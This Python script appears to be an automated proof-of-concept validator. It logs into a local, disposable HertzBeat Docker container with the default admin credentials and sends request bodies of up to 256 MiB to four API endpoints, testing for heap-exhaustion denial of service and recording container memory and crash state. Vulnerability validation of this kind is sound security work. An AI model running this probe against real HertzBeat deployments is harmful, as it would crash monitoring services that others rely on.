#!/usr/bin/env python3
"""Isolated HertzBeat large-body probe against local disposable docker."""
from __future__ import annotations

import json
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path

BASE = "http://127.0.0.1:2157"
CONTAINER = "dosval-poc33-hertzbeat"
ROOT = Path(
    "/home/furina/new_tool/dos-analysis-web/results/java_web_dos_batch/"
    "poc33-real-llm-full-v2-20260824_110233-dynamic-validation"
)
CASES = {
    "alerts": ROOT
    / "cases/apache__hertzbeat-finding_899490a7bb8bfc450503722a-PROBE-apache__hertzbeat_resource_0122c6b8928e9d173ac3751d-ffcdbd304400d722dc97",
    "otlp_json": ROOT
    / "cases/apache__hertzbeat-finding_0635bf840461c1ec6de4fdfe-PROBE-apache__hertzbeat_resource_cbd7053e9bee066a2de7b2da-ec65baf8accba06827bc",
    "ingest": ROOT
    / "cases/apache__hertzbeat-finding_53e6eaee2ac09ca583a6b6a6-PROBE-apache__hertzbeat_resource_d196c143f31c0c4e863aff41-253de7bb5cf3a6198178",
    "otlp_bin": ROOT
    / "cases/apache__hertzbeat-finding_55c30b3e267a8a3469453587-PROBE-apache__hertzbeat_resource_fbb49258d9eb910cfa196a48-7c52f61e249df086c1c2",
}


def run(cmd, timeout=20):
    try:
        p = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.strip(), p.stderr.strip()
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"


def docker_stats():
    rc, out, err = run(
        ["docker", "stats", "--no-stream", "--format", "{{json .}}", CONTAINER],
        timeout=15,
    )
    if rc != 0:
        return {"error": err or out}
    try:
        return json.loads(out)
    except json.JSONDecodeError:
        return {"raw": out}


def container_state():
    rc, out, err = run(
        [
            "docker",
            "inspect",
            "--format",
            "{{.State.Status}} oom={{.State.OOMKilled}} exit={{.State.ExitCode}}",
            CONTAINER,
        ]
    )
    return {"rc": rc, "out": out, "err": err}


def login():
    body = json.dumps(
        {"type": 0, "identifier": "admin", "credential": "hertzbeat"}
    ).encode()
    req = urllib.request.Request(
        f"{BASE}/api/account/auth/form",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read())
    token = data["data"]["token"]
    return token


def post(path, token, payload: bytes, content_type: str, timeout=180):
    req = urllib.request.Request(
        f"{BASE}{path}",
        data=payload,
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": content_type,
        },
        method="POST",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(256)
            return {
                "http": resp.status,
                "seconds": round(time.monotonic() - started, 3),
                "body": body.decode("utf-8", "replace"),
                "error": None,
            }
    except urllib.error.HTTPError as exc:
        body = exc.read(256)
        return {
            "http": exc.code,
            "seconds": round(time.monotonic() - started, 3),
            "body": body.decode("utf-8", "replace"),
            "error": None,
        }
    except Exception as exc:  # noqa: BLE001
        return {
            "http": 0,
            "seconds": round(time.monotonic() - started, 3),
            "body": "",
            "error": repr(exc),
        }


def probe_one(name, case: Path, path, content_type, sizes_mib, token, binary=False):
    rnd = case / "rounds" / "round-1"
    ev = rnd / "evidence"
    logs = rnd / "logs"
    ev.mkdir(parents=True, exist_ok=True)
    logs.mkdir(parents=True, exist_ok=True)
    (rnd / "hypothesis.json").write_text(
        json.dumps(
            {
                "round": 1,
                "hypothesis": (
                    "Default-admin authenticated large request body is fully "
                    "materialized as String/byte[] and can exhaust HertzBeat heap."
                ),
                "path": path,
                "sizes_mib": sizes_mib,
            },
            indent=2,
        )
        + "\n"
    )
    observations = []
    baseline = docker_stats()
    (ev / "baseline_stats.json").write_text(json.dumps(baseline, indent=2) + "\n")
    failure = False
    for mib in sizes_mib:
        payload = (b"A" * (mib * 1024 * 1024)) if binary else ("A" * (mib * 1024 * 1024)).encode()
        before = docker_stats()
        result = post(path, token, payload, content_type, timeout=240)
        after = docker_stats()
        state = container_state()
        rec = {
            "mib": mib,
            "path": path,
            "result": result,
            "before": before,
            "after": after,
            "state": state,
        }
        observations.append(rec)
        (ev / f"obs_{mib}mib.json").write_text(json.dumps(rec, indent=2) + "\n")
        print(name, mib, "MiB", result["http"], result["error"], state["out"], flush=True)
        if state["out"].startswith("exited") or "oom=true" in state["out"] or result["http"] in (0, 502, 503):
            failure = True
            break
        if result["http"] not in (200, 201, 202, 400, 415):
            # 400 may still have materialized; continue unless transport death
            if result["http"] == 401:
                break
    (rnd / "observations.json").write_text(json.dumps(observations, indent=2) + "\n")
    (rnd / "metrics.jsonl").write_text(
        "\n".join(json.dumps({"mib": o["mib"], "http": o["result"]["http"], "after": o["after"]}) for o in observations)
        + "\n"
    )
    logs_txt = run(["docker", "logs", "--tail", "80", CONTAINER], timeout=20)[1]
    (logs / "container_tail.txt").write_text(logs_txt + "\n")
    return observations, failure, baseline


def main():
    token = login()
    print("login_ok", flush=True)
    # small control to prove sink
    control = post(
        "/api/alerts/report/prometheus",
        token,
        b"hello-control",
        "text/plain",
        timeout=20,
    )
    print("control", control, flush=True)
    sizes = [8, 32, 64, 128, 256]
    results = {}
    results["alerts"] = probe_one(
        "alerts",
        CASES["alerts"],
        "/api/alerts/report/prometheus",
        "text/plain",
        sizes,
        token,
        binary=False,
    )
    # if container died, stop
    if container_state()["out"].startswith("exited"):
        print("container dead after alerts", flush=True)
        print(json.dumps({k: {"failure": v[1], "n": len(v[0])} for k, v in results.items()}))
        return
    results["otlp_json"] = probe_one(
        "otlp_json",
        CASES["otlp_json"],
        "/api/logs/otlp/v1/logs",
        "application/json",
        sizes,
        token,
        binary=False,
    )
    if container_state()["out"].startswith("exited"):
        print("container dead after otlp_json", flush=True)
        print(json.dumps({k: {"failure": v[1], "n": len(v[0])} for k, v in results.items()}))
        return
    results["ingest"] = probe_one(
        "ingest",
        CASES["ingest"],
        "/api/logs/ingest/otlp",
        "text/plain",
        sizes,
        token,
        binary=False,
    )
    if container_state()["out"].startswith("exited"):
        print("container dead after ingest", flush=True)
        print(json.dumps({k: {"failure": v[1], "n": len(v[0])} for k, v in results.items()}))
        return
    results["otlp_bin"] = probe_one(
        "otlp_bin",
        CASES["otlp_bin"],
        "/api/logs/otlp/v1/logs",
        "application/x-protobuf",
        sizes,
        token,
        binary=True,
    )
    print(json.dumps({k: {"failure": v[1], "n": len(v[0])} for k, v in results.items()}))


if __name__ == "__main__":
    main()
